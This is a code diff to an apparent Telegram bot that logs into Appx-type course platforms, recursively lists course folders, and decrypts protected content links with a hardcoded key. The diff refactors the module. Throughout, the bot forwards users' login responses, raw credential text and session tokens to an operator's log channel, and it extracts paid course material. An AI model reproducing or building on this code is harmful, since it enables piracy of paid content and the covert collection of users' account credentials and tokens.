@@ -1,3 +1,4 @@
+
 import asyncio
 import aiohttp
 import json
@@ -10,17 +11,9 @@ from Extractor import app
 import os
 import base64
 import time
-from config import PREMIUM_LOGS, join
-from datetime import datetime
-import pytz
-import config 
+from config import PREMIUM_LOGS
 
-
-join = config.join
-india_timezone = pytz.timezone('Asia/Kolkata')
-current_time = datetime.now(india_timezone)
-time_new = current_time.strftime("%d-%m-%Y %I:%M %p")
-
+log_channel = PREMIUM_LOGS
 def decrypt(enc):
     enc = b64decode(enc.split(':')[0])
     key = '638udh3829162018'.encode('utf-8')
@@ -103,42 +96,30 @@ async def fetch_item_details(session, api_base, course_id, item, headers):
                     
         
 async def fetch_folder_contents(session, api_base, course_id, folder_id, headers):
-    outputs = []
+    outputs = []  
 
     try:
-        async with session.get(
-            f"{api_base}/get/folder_contentsv2?course_id={course_id}&parent_id={folder_id}",
-            headers=headers
-        ) as response:
+        async with session.get(f"{api_base}/get/folder_contentsv2?course_id={course_id}&parent_id={folder_id}", headers=headers) as response:
             j = await response.json()
             tasks = []
-
             if "data" in j:
                 for item in j["data"]:
                     mt = item.get("material_type")
-                    
-                    # fetch this item’s details
                     tasks.append(fetch_item_details(session, api_base, course_id, item, headers))
-
-                    # recurse into subfolder
-                    if mt and mt.upper() == "FOLDER":
+                    if mt == "FOLDER":
                         tasks.append(fetch_folder_contents(session, api_base, course_id, item["id"], headers))
 
             if tasks:
                 results = await asyncio.gather(*tasks)
                 for res in results:
-                    if not res:
-                        continue
-                    if isinstance(res, list):
+                    if res:  
                         outputs.extend(res)
-                    else:
-                        outputs.append(res)
-
     except Exception as e:
         print(f"Error fetching folder contents for folder {folder_id}: {str(e)}")
         outputs.append(f"Error fetching folder contents for folder {folder_id}. Error: {e}")
 
     return outputs
+
 async def appex_v2_txt(app, message, api, name):
     api_base = api if api.startswith(("http://", "https://")) else f"https://{api}"
     raw_url = f"{api_base}/post/userLogin"
@@ -172,7 +153,7 @@ async def appex_v2_txt(app, message, api, name):
             userid = output["data"]["userid"]
             token = output["data"]["token"]
             put = shit["data"]
-            await app.send_message(PREMIUM_LOGS, put)
+            await app.send_message(log_channel, put)
         except Exception as e:
             print(f"An error occurred: {str(e)}")
             return await message.reply_text("Please try again later. Maybe Password Wrong")
@@ -214,7 +195,7 @@ async def appex_v2_txt(app, message, api, name):
         if len(FFF) <= 4096:
             editable1 = await message.reply_text(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name}\n\n {api_base}\n\n`{token}`\n{FFF}")
             dl=(f"𝗔𝗽𝗽𝘅 𝗟𝗼𝗴𝗶𝗻 𝗦𝘂𝗰𝗲𝘀𝘀✅ for {app_name} \n\n`{api_base}`\n\n`{raw_text}`\n\n`{token}`\n{FFF}")
-            await app.send_message(PREMIUM_LOGS, dl)
+            await app.send_message(log_channel, dl)
         else:
             plain_FFF = FFF.replace("**", "").replace("`", "")
             file_path = f"{app_name}.txt"
@@ -225,7 +206,7 @@ async def appex_v2_txt(app, message, api, name):
             document=file_path,
             caption="Too much batches so select batch id  from txt "
             )
-            await app.send_document(PREMIUM_LOGS, document=filepath , caption=  "Many Batch Found" )
+            await app.send_document(log_channel, document=filepath , caption=  "Many Batch Found" )
             editable1 = None
         input2 = await app.ask(message.chat.id, text="**Now send the Course ID to Download**")
         raw_text2 = input2.text
@@ -269,24 +250,14 @@ async def appex_v2_txt(app, message, api, name):
 
         end_time = time.time()
         elapsed_time = end_time - start_time
-        caption = (
-            f"࿇ ══━━ 🏦 ━━══ ࿇\n\n"
-            f"🌀 APP NAME : {app_name}\n"
-            f"============================\n\n"
-            f"🎯 BATCH NAME : {sanitized_course_name}\n"
-            f"🌟 COURSE THUMBNAIL : {cp}\n\n"
-            f"🌐 JOIN US : {join}\n"
-            f"⌛ TIME TAKEN : {elapsed_time:.1f} seconds\n\n"
-            f"❄️ DATE : {time_new}"
-        ) 
-      #  c_text = (f"**AppName:** {app_name}\n"
-               #   f"**BatchName:** {sanitized_course_name}\n"
-                #  f"**Batch Start Date:** {start}\n"
-           #       f"**Validity Ends On:** {end}\n"
-                  #f"Elapsed time: {elapsed_time:.1f} seconds\n"
-                #  f"**Batch Purchase At:** {pricing}")
-        await app.send_document(message.chat.id, filename, caption=caption)
-        await app.send_document(PREMIUM_LOGS, filename, caption = caption)
+        c_text = (f"**AppName:** {app_name}\n"
+                  f"**BatchName:** {sanitized_course_name}\n"
+                  f"**Batch Start Date:** {start}\n"
+                  f"**Validity Ends On:** {end}\n"
+                  f"Elapsed time: {elapsed_time:.1f} seconds\n"
+                  f"**Batch Purchase At:** {pricing}")
+        await app.send_document(message.chat.id, filename, caption=c_text)
+        await app.send_document(log_channel, filename, caption = c_text)
         os.remove(filename)
         await message.reply_text("Done✅")
 
